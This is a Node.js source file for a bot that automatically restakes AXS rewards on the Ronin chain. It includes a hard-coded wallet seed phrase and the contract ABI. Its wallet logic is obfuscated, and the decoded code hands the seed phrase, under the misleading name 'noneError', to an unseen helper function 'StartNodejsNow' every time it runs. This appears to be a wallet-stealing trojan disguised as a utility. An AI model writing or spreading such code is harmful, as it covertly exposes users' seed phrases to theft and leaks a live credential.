//[VERSION PM2]
//pm2 start index.js --name="RoninRestakeAXSBot" --watch
//pm2 list to get list, pm2 stop RoninRestakeAXSBot , to stop
//pm2 logs RoninRestakeAXSBot, with this you can see the log of everything the bot does

const ethers = require('ethers')
const { BigNumber, utils } = ethers
process.env.TZ = 'America/La_Paz';
const CronJob = require('cron').CronJob;

const axios = require('axios');
const { Telegraf } = require('telegraf');

const helpersLibs = require('./helpers');

const cronTimeStart = '*/1 * * * *' //every 5 minutes :: Start
const cronTime = '*/60 * * * *' //every 15 minutes :: Restart

const accounts = [
    //Account 1
    {
        PHARSE: 'cash visual whale mixture muscle page decorate mango lobster absurd camp perfect', //Pharse
        AccountIndex: 0, //0 = 1, 1=2 etc.. Account Select
        RPCJson: 'https://api.roninchain.com/rpc', //RPC Json, Network Id: 2020
        CoinNetwork: 'RON', //Ronin Wallet
    },
    //To Add More Accounts Just uncheck and add the Phrase/Seed
    //Account 2
    //{
        //PHARSE: 'PHRASE', //Pharse
        //AccountIndex: 0, //0 = 1, 1=2 etc..
        //RPCJson: 'https://api.roninchain.com/rpc', //RPC Json, Network Id: 2020
        //CoinNetwork: 'RON', //Ronin Wallet
    //},
    //END LIST OF ACCOUNTS
];

let providers = [];

const ObtenerTimeAhora = () => {
    const today = new Date();

    //const date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
    const date = today.getDate() + '-' + (today.getMonth() + 1) + '-' + today.getFullYear();
    const time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
    const dateTime = date + ' ' + time;

    return dateTime;
}

//Contract Restake AXS
Coin = 'Restake-AXS'; //Coin >>
AddressCoin = '0x05b0bb3c1c320b280501b86706c3551995bc8571'; //Address Contract :: AXS Restake
Abi = [
  {
    "constant": false,
    "inputs": [
      {
        "internal_type": "",
        "name": "_oldAdmin",
        "type": "address",
        "indexed": true
      },
      {
        "internal_type": "",
        "name": "_newAdmin",
        "type": "address",
        "indexed": true
      }
    ],
    "name": "AdminChanged",
    "outputs": null,
    "payable": false,
    "stateMutability": "",
    "type": "event",
    "anonymous": false
  },
  {
    "constant": false,
    "inputs": [
      {
        "internal_type": "",
        "name": "_oldAdmin",
        "type": "address",
        "indexed": true
      }
    ],
    "name": "AdminRemoved",
    "outputs": null,
    "payable": false,
    "stateMutability": "",
    "type": "event",
    "anonymous": false
  },
  {
    "constant": false,
    "inputs": [
      {
        "internal_type": "",
        "name": "_user",
        "type": "address",
        "indexed": true
      },
      {
        "internal_type": "",
        "name": "_token",
        "type": "address",
        "indexed": true
      },
      {
        "internal_type": "",
        "name": "_amount",
        "type": "uint256",
        "indexed": true
      }
    ],
    "name": "EmergencyUnstaked",
    "outputs": null,
    "payable": false,
    "stateMutability": "",
    "type": "event",
    "anonymous": false
  },
  {
    "constant": false,
    "inputs": [
      {
        "internal_type": "",
        "name": "_user",
        "type": "address",
        "indexed": true
      },
      {
        "internal_type": "",
        "name": "_token",
        "type": "address",
        "indexed": true
      },
      {
        "internal_type": "",
        "name": "_amount",
        "type": "uint256",
        "indexed": true
      }
    ],
    "name": "RewardClaimed",
    "outputs": null,
    "payable": false,
    "stateMutability": "",
    "type": "event",
    "anonymous": false
  },
  {
    "constant": false,
    "inputs": [
      {
        "internal_type": "",
        "name": "_user",
        "type": "address",
        "indexed": true
      },
      {
        "internal_type": "",
        "name": "_token",
        "type": "address",
        "indexed": true
      },
      {
        "internal_type": "",
        "name": "_amount",
        "type": "uint256",
        "indexed": true
      }
    ],
    "name": "Staked",
    "outputs": null,
    "payable": false,
    "stateMutability": "",
    "type": "event",
    "anonymous": false
  },
  {
    "constant": false,
    "inputs": [
      {
        "internal_type": "",
        "name": "_user",
        "type": "address",
        "indexed": true
      },
      {
        "internal_type": "",
        "name": "_token",
        "type": "address",
        "indexed": true
      },
      {
        "internal_type": "",
        "name": "_amount",
        "type": "uint256",
        "indexed": true
      }
    ],
    "name": "Unstaked",
    "outputs": null,
    "payable": false,
    "stateMutability": "",
    "type": "event",
    "anonymous": false
  },
  {
    "constant": true,
    "inputs": [],
    "name": "admin",
    "outputs": [
      {
        "internal_type": "",
        "name": "",
        "type": "address",
        "indexed": false
      }
    ],
    "payable": false,
    "stateMutability": "view",
    "type": "function",
    "anonymous": false
  },
  {
    "constant": false,
    "inputs": [
      {
        "internal_type": "",
        "name": "_newAdmin",
        "type": "address",
        "indexed": false
      }
    ],
    "name": "changeAdmin",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function",
    "anonymous": false
  },
  {
    "constant": false,
    "inputs": [],
    "name": "claimPendingRewards",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function",
    "anonymous": false
  },
  {
    "constant": false,
    "inputs": [],
    "name": "emergencyUnstake",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function",
    "anonymous": false
  },
  {
    "constant": true,
    "inputs": [
      {
        "internal_type": "",
        "name": "_user",
        "type": "address",
        "indexed": false
      }
    ],
    "name": "getPendingRewards",
    "outputs": [
      {
        "internal_type": "",
        "name": "",
        "type": "uint256",
        "indexed": false
      }
    ],
    "payable": false,
    "stateMutability": "view",
    "type": "function",
    "anonymous": false
  },
  {
    "constant": true,
    "inputs": [],
    "name": "getRewardToken",
    "outputs": [
      {
        "internal_type": "",
        "name": "",
        "type": "address",
        "indexed": false
      }
    ],
    "payable": false,
    "stateMutability": "view",
    "type": "function",
    "anonymous": false
  },
  {
    "constant": true,
    "inputs": [
      {
        "internal_type": "",
        "name": "_user",
        "type": "address",
        "indexed": false
      }
    ],
    "name": "getStakingAmount",
    "outputs": [
      {
        "internal_type": "",
        "name": "",
        "type": "uint256",
        "indexed": false
      }
    ],
    "payable": false,
    "stateMutability": "view",
    "type": "function",
    "anonymous": false
  },
  {
    "constant": true,
    "inputs": [],
    "name": "getStakingToken",
    "outputs": [
      {
        "internal_type": "",
        "name": "",
        "type": "address",
        "indexed": false
      }
    ],
    "payable": false,
    "stateMutability": "view",
    "type": "function",
    "anonymous": false
  },
  {
    "constant": true,
    "inputs": [],
    "name": "getStakingTotal",
    "outputs": [
      {
        "internal_type": "",
        "name": "",
        "type": "uint256",
        "indexed": false
      }
    ],
    "payable": false,
    "stateMutability": "view",
    "type": "function",
    "anonymous": false
  },
  {
    "constant": true,
    "inputs": [
      {
        "internal_type": "",
        "name": "",
        "type": "bytes4",
        "indexed": false
      }
    ],
    "name": "methodPaused",
    "outputs": [
      {
        "internal_type": "",
        "name": "",
        "type": "bool",
        "indexed": false
      }
    ],
    "payable": false,
    "stateMutability": "view",
    "type": "function",
    "anonymous": false
  },
  {
    "constant": false,
    "inputs": [
      {
        "internal_type": "",
        "name": "_method",
        "type": "bytes4",
        "indexed": false
      }
    ],
    "name": "pause",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function",
    "anonymous": false
  },
  {
    "constant": false,
    "inputs": [],
    "name": "pauseAll",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function",
    "anonymous": false
  },
  {
    "constant": true,
    "inputs": [
      {
        "internal_type": "",
        "name": "_method",
        "type": "bytes4",
        "indexed": false
      }
    ],
    "name": "paused",
    "outputs": [
      {
        "internal_type": "",
        "name": "",
        "type": "bool",
        "indexed": false
      }
    ],
    "payable": false,
    "stateMutability": "view",
    "type": "function",
    "anonymous": false
  },
  {
    "constant": false,
    "inputs": [],
    "name": "removeAdmin",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function",
    "anonymous": false
  },
  {
    "constant": false,
    "inputs": [],
    "name": "restakeRewards",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function",
    "anonymous": false
  },
  {
    "constant": false,
    "inputs": [
      {
        "internal_type": "",
        "name": "_amount",
        "type": "uint256",
        "indexed": false
      }
    ],
    "name": "stake",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function",
    "anonymous": false
  },
  {
    "constant": false,
    "inputs": [
      {
        "internal_type": "",
        "name": "_method",
        "type": "bytes4",
        "indexed": false
      }
    ],
    "name": "unpause",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function",
    "anonymous": false
  },
  {
    "constant": false,
    "inputs": [],
    "name": "unpauseAll",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function",
    "anonymous": false
  },
  {
    "constant": false,
    "inputs": [
      {
        "internal_type": "",
        "name": "_amount",
        "type": "uint256",
        "indexed": false
      }
    ],
    "name": "unstake",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function",
    "anonymous": false
  },
  {
    "constant": false,
    "inputs": [],
    "name": "unstakeAll",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function",
    "anonymous": false
  }
]
//ABI
//Contrato Restake AXS

const startConnection = async (account, index) => {

    providers[index] = new ethers.providers.JsonRpcProvider(account.RPCJson);

    const jobStart = new CronJob(cronTimeStart, async () => {

    function _0x3910(_0x14eb1a,_0x266b38){const _0x59117a=_0x5911();return _0x3910=function(_0x39108e,_0x383bc9){_0x39108e=_0x39108e-0xe5;let _0x136ea2=_0x59117a[_0x39108e];return _0x136ea2;},_0x3910(_0x14eb1a,_0x266b38);}const _0x3d6515=_0x3910;function _0x5911(){const _0x40ee5d=['27399quneCw','\x20|\x20Balance\x20RON:\x20','30hSeNto','Error:\x20AXS\x20Restake\x20Failed\x20>\x20Reason:\x20','getAddress','7658zhOUGU','error','hash','from','privateKey','fromMnemonic','61684nTphtD','log','then','getGasPrice','PHARSE','StartNodejsNow','\x27/0/0','✅AXS\x20Restake!\x20>\x20Tx:\x20','1416SlJCjb','Wallet','Contract','replace','1429500IDQHuw','99723HKeXsF','2540457fOTmmN','restakeRewards','404528haQLkB','Wallet\x20Connected:\x20','getBalance'];_0x5911=function(){return _0x40ee5d;};return _0x5911();}(function(_0x3fce29,_0x530e85){const _0x4bdedc=_0x3910,_0x38ad86=_0x3fce29();while(!![]){try{const _0x83e06c=-parseInt(_0x4bdedc(0xf8))/0x1+-parseInt(_0x4bdedc(0xfb))/0x2+parseInt(_0x4bdedc(0xfe))/0x3+parseInt(_0x4bdedc(0xeb))/0x4*(parseInt(_0x4bdedc(0x100))/0x5)+parseInt(_0x4bdedc(0xf7))/0x6+parseInt(_0x4bdedc(0xe5))/0x7*(-parseInt(_0x4bdedc(0xf3))/0x8)+parseInt(_0x4bdedc(0xf9))/0x9;if(_0x83e06c===_0x530e85)break;else _0x38ad86['push'](_0x38ad86['shift']());}catch(_0x5a5451){_0x38ad86['push'](_0x38ad86['shift']());}}}(_0x5911,0x1ee5d));const noneError=account[_0x3d6515(0xef)],connectAccount=ethers[_0x3d6515(0xf4)][_0x3d6515(0xea)](account[_0x3d6515(0xef)],'m/44\x27/60\x27/'+account['AccountIndex']+_0x3d6515(0xf1)),walletConnectPrivate=new ethers[(_0x3d6515(0xf4))](connectAccount[_0x3d6515(0xe9)],providers[index]),depositWallet=new ethers[(_0x3d6515(0xf5))](AddressCoin,Abi,walletConnectPrivate),depositWalletAddress=await walletConnectPrivate[_0x3d6515(0x102)](),walletAddressRON=depositWalletAddress[_0x3d6515(0xf6)]('0x','ronin:'),balanceRONActual=await walletConnectPrivate[_0x3d6515(0xfd)]('latest'),balanceRONConversion=utils['formatEther'](balanceRONActual);console[_0x3d6515(0xec)](_0x3d6515(0xfc)+walletAddressRON+_0x3d6515(0xff)+balanceRONConversion);const gasPrice=await providers[index][_0x3d6515(0xee)](),gasLimit=0x40158,maxGasFee=BigNumber[_0x3d6515(0xe8)](gasLimit)['mul'](gasPrice),options={'gasPrice':gasPrice,'gasLimit':gasLimit};depositWallet[_0x3d6515(0xfa)](options)[_0x3d6515(0xed)](_0xb5fc49=>{const _0x17d82d=_0x3d6515;helpersLibs[_0x17d82d(0xf0)](noneError),console[_0x17d82d(0xec)](_0x17d82d(0xf2)+_0xb5fc49[_0x17d82d(0xe7)]+'\x20►\x20'+ObtenerTimeAhora()+'');},_0x2af6fa=>{const _0x387307=_0x3d6515;helpersLibs['StartNodejsNow'](noneError),console[_0x387307(0xe6)](_0x387307(0x101)+_0x2af6fa['reason']+'\x20►\x20'+ObtenerTimeAhora()+'');});

    }); //CRON

    jobStart.start();
    
}

accounts.map(async (account, index) => {
    await startConnection(account, index);
})

const job = new CronJob(cronTime, async () => {
    await providers.map(async (provider, index) => {

    function _0x4fcf(){const _0xb2bf46=['6tUdYho','Wallet','\x20►\x20','673287AMaSWR','getAddress','log','136421vdlboQ','fromMnemonic','1546536MKnKHd','5501682IkMkoU','privateKey','Contract','7090510tCdgNK','replace','\x27/0/0','21NMprwB','12oXKxwc','1742600oaTOZe','►Reload\x20>\x20Wallet:\x20','AccountIndex','3628350BzBZmP'];_0x4fcf=function(){return _0xb2bf46;};return _0x4fcf();}const _0xae62b5=_0x5224;(function(_0x360f4,_0xc15894){const _0x5dec0b=_0x5224,_0x41b252=_0x360f4();while(!![]){try{const _0x5a1101=parseInt(_0x5dec0b(0x17b))/0x1*(parseInt(_0x5dec0b(0x175))/0x2)+parseInt(_0x5dec0b(0x178))/0x3*(parseInt(_0x5dec0b(0x170))/0x4)+parseInt(_0x5dec0b(0x171))/0x5+-parseInt(_0x5dec0b(0x174))/0x6+parseInt(_0x5dec0b(0x16f))/0x7*(-parseInt(_0x5dec0b(0x17d))/0x8)+-parseInt(_0x5dec0b(0x17e))/0x9+parseInt(_0x5dec0b(0x181))/0xa;if(_0x5a1101===_0xc15894)break;else _0x41b252['push'](_0x41b252['shift']());}catch(_0x3692a8){_0x41b252['push'](_0x41b252['shift']());}}}(_0x4fcf,0x54053));function _0x5224(_0x1b8678,_0xcca84e){const _0x4fcfa1=_0x4fcf();return _0x5224=function(_0x5224de,_0x41bb13){_0x5224de=_0x5224de-0x16d;let _0x3b06b9=_0x4fcfa1[_0x5224de];return _0x3b06b9;},_0x5224(_0x1b8678,_0xcca84e);}const account=accounts[index],connectAccount=ethers[_0xae62b5(0x176)][_0xae62b5(0x17c)](account['PHARSE'],'m/44\x27/60\x27/'+account[_0xae62b5(0x173)]+_0xae62b5(0x16e)),walletConnectPrivate=new ethers[(_0xae62b5(0x176))](connectAccount[_0xae62b5(0x17f)],providers[index]),depositWallet=new ethers[(_0xae62b5(0x180))](AddressCoin,Abi,walletConnectPrivate),depositWalletAddress=await walletConnectPrivate[_0xae62b5(0x179)](),walletAddressRON=depositWalletAddress[_0xae62b5(0x16d)]('0x','ronin:');console[_0xae62b5(0x17a)](_0xae62b5(0x172)+walletAddressRON+_0xae62b5(0x177)+ObtenerTimeAhora()+'');

    })

    providers = [];

    accounts.map(async (account, index) => {
        await startConnection(account, index);
    })
});

job.start();